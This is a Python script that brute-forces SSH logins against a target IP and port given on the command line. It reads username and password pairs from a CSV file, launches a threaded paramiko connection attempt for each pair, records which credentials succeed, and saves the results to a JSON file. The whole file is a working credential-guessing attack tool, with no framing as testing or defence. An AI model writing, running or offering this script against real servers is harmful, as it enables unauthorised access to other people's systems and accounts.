import csv
import sys
import threading
import ipaddress
import time
import json
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception

# Global variable to store the results
results = []

def ssh_connect(host, username, password, port):
    global results
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=port, username=username, password=password, banner_timeout=300)
        results.append({"Username": username, "Password": password, "Result": "Found"})
    except AuthenticationException:
        results.append({"Username": username, "Password": password, "Result": "Incorrect"})
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

def get_ip_address(arg0):
    while True:
        host = arg0
        try:
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Please enter a valid IP address.")

def start_ssh_connection(arg0, arg1):
    host = get_ip_address(arg0)
    port = int(arg1)
    list_file = "passwords.csv"

    def ssh_connection():
        with open(list_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:
                    continue
                else:
                    t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1], port))
                    t.start()
                    time.sleep(0.2)

    threading.Thread(target=ssh_connection).start()

if __name__ == "__main__":
    arg0 = sys.argv[1]
    arg1 = sys.argv[2]
    start_ssh_connection(arg0, arg1)

    # Wait for all threads to complete before printing the results
    main_thread = threading.currentThread()
    for t in threading.enumerate():
        if t is not main_thread:
            t.join()

    # Write the results to a JSON file
    with open("results_of_{}_{}.json".format(arg0,arg1), "w") as json_file:
        json.dump(results, json_file)

    print("Results have been written to 'results.json' file.")